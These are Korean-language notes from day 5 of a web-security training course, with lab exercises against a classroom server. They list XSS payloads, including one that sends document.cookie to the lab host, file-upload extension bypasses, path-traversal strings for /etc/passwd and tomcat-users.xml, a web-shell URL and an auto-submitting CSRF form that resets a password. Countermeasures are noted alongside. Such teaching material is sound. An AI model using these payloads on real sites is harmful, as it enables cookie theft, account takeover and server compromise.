5일차

정보누출 취약점

주석처리를 잘하지 못한경우
클라이언트사이드에서 필터링하는 경우


http://192.168.195.132:8080/WebGoat/attack

webgoat/webgoat

-------------------------------------------------------------------
XSS 크로스 사이트 스크립팅(Cross Site Scripting)

취약점이 있는 웹사이트에 방문한 사용자의 웹 브라우저에서 악의적인 HTML 태그나 자바스크립트가 동작하는 공격

영향 : 쿠키훔치기(쿠키 재생 공격)
        악성코드 주소 삽입.
        악성사이트로 이동
        페이지 변조
        브라우저 원격제어

-----------------------------------------------------------

반사 XSS
서버가 외부에서 입력받은 값을 받아 브라우저에게 응답할때 전송하는 과정에서 클라이언트가 입력한 파라미터의 위험한 문자를 그대로 돌려주면서 발생한다.
보통 검색창에서 많이 발생
웹 사이트에 보내는 모든 파라미터에 가능할 수 있다.
보통 피싱에 많이 사용한다.


저장 XSS
저장 XSS 취약점이 존재하는 웹서버에 악성스크립트를 영구적으로 저장하는 방법
보통 게시판 글, 댓글, 개인정보수정 페이지


'"><marquee>text   -> xss 공격이라하기는 좀 약하다.

"><script>alert("xss")</script>
'><script>alert("xss")</script>
<img src=@ onerror=alert(1234);>
<video src="1" onerror=document.location="http://naver.com">

<script>document.write ("<iframe src='http://chol.com' width=100 height=100></iframe>")</script>
<iframe src='http://chol.com' width=100 height=100></iframe>

<script>document.location.href="http://www.naver.com"</script>

google xss payload inurl:github

---------------------------------
쿠키 탈취 실습

1. 쿠키에 접근가능한지, 그리고 XSS가 가능한지 확인
<script>alert(document.cookie)</script>
2. iframe 태그를 이용한 공격

http://70.12.113.49:8081/

<script>document.write("<iframe src='http://70.12.113.49:8081/XSSAttack/1.asp?cookie="+document.cookie+"' width=0 height=0></iframe>")</script>

http://70.12.113.49:8081/XSSAttack/attack_cookie.txt

----------------------------------------------------------------------
파일 업로드 취약점

정상적인 파일이 아닌 악의적인 악성코드(예 : 웹쉘)가 서버에 업로드 가능하여 서버권한탈취등 서버에 피해를 끼치는 취약점

교재 -> 275P
------------------------------------
Content-Type: image/gif

./   ../   ../../   ../../../
../../download/

.\  ..\  .\  ..\
..\..\..\
----------------------------------------

*.asp : cer  asa  cds  cdx
*.php :  php3 php4 php5  html  htm  phtml  inc
*.jsp : war  jsf

asp.net  : aspx, asax,ascx,ashx,axd,asmx,config,cs,csproj,licx,rem,resources, resx, soap, vb, vbproj, vsdisco, webinfo 등
-----------------------------------------

.php::&data
.php%00.jpg
       %0a
.php;.jpg        asp;.jpg
php 전용 취약점 : .php.kr
.js%70       %2ejsp
-----------------------------------------------------
대응방안
../ 필터링
업로드되는 url지점에서 실행권한을 제한
업로드되는 파일의 이름을 바꾼다.
화이트리스트 방식으로 업로드 확장자 제한

---------------------------------
퀴즈 : 이런 방법 말고 파일업로드취약점공격을 막는 정말 확실한방법은 무엇인가? 파일업로드를 그냥 막는게 낫다.

==============================================
심심풀이
아래 url은 우리가 배운 웹 취약점중 무슨 공격기법을 이용한 것인가?
http://cafe.daum.net/dotax/FGFP/9109?q=%C8%F7%BE%EE%B7%CE%C1%EE%20%BF%C0%BA%EA%20%B4%F5%20%C5%B9%BD%BA

-----------------------------------
파일 다운로드 취약점

접근이 제한되어야 할 파일에 접근하여 다운로드 할 수 있는 취약점

/etc/passwd 

운영체제의 중요파일, 중요한 설정파일, asp,php,jsp같은 소스코드

공격방법: 파라미터의 url 경로를 변조해서 다운로드 시도

../../../etc/passwd
../../../../../../../etc/hosts

../../../../../../../../Windows/System32/drivers/etc/hosts
..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts

/../../../../../../../../
./.././.././../etc/./passwd

------------------------------------------------

../../../../../../../../WINNT/System32/drivers/etc/hosts


http://70.12.113.49:8081/chapter1/down.asp?filename=../../../../../../../../WINNT/System32/drivers/etc/hosts

----------------------------------------------------------------------
과제 : chapter1게시판에서 down.asp를 다운로드취약점을 이용하여 다운로드하여 down.asp의 소스코드를 확인하라!!

../../../../../chapter1/down.asp

chapter1/upload/upload/upload/upload/shellw(2).asp

http://70.12.113.49:8081/chapter1/upload/upload/upload/upload/shellw(2).asp

-------------------------------------------------------------
../../../../tomcat/conf/tomcat-users.xml

LFI(Local file inclusion)
RFI(Remote file inclusion)
-----------------------------------------------------------
파일다운로드 취약점 대응방안
1. ../ ..\
2. 파일다운로드 모듈 구현시 실제 파일경로는 Db에 저장하도록하고 사용자에게 노출되는 URl의 파라미터에는 인덱스 번호를 통해 다운로드할 파일을 표시한다.
========================
리다이렉트 취약점
http://naver.com?url=daum.net
-------------------------------------
히든필드
----------------------------------------------
CSRF (Cross-Site Request Forgery)
사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위를 특정 웹서버에 요청하게 하는 공격

csrf 취약점 진단방법 : 웹사이트에 XSS 취약점이 있는지 확인하고 불충분한 인증이 있는지 확인한다.

참고 : CSRF에 XSS취약점은 필수는 아니지만 국내에서는 XSS 취약점이 필요한걸로 보통 생각하고 있는 편이다.

CSRF 실습
<img src= "http://target.com?param=1">
<iframe src= "http://target.com?param=1">

Autopostion Form 방식(POST 요청방식)
------------------------------------------------------
POST /member/mem_modify_ok.asp HTTP/1.1
Host: 70.12.113.49:8081

pwd=1111&name=%B0%AD%BB%E7&email=1111

-======================================

<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='http://70.12.113.49:8081/member/mem_modify_ok.asp' target="csrf-frame" id="csrf-form">
<input type="hidden" name="pwd" value="1234"/>
<input type="hidden" name="name" value="angel"/>
<input type="hidden" name="email" value="angel@angel.com"/>
</form>
<script>document.getElementById("csrf-form").submit()</script>

대응책 : XSS 공격 대응방안과 유사
            강력한 인증을 한다.

------------------------------
클릭 재킹 (XSS와 유사하지만 위험도 낮음)

<a href="http://www.naver.com">네이버로이동</a>

<a onmouseup=window.open("http://www.daum.net") href="http://www.naver.com">네이버로이동</a>

----------------------------------------------------
교재 정독
owasp top 10 공부(2017)
과제 : 주요기반시설취약점진단가이드 웹 28개취약점

쇼핑몰 : 코어몰 사이트, 아바타몰 사이트   (5시반까지 오픈)
                  81                 82       













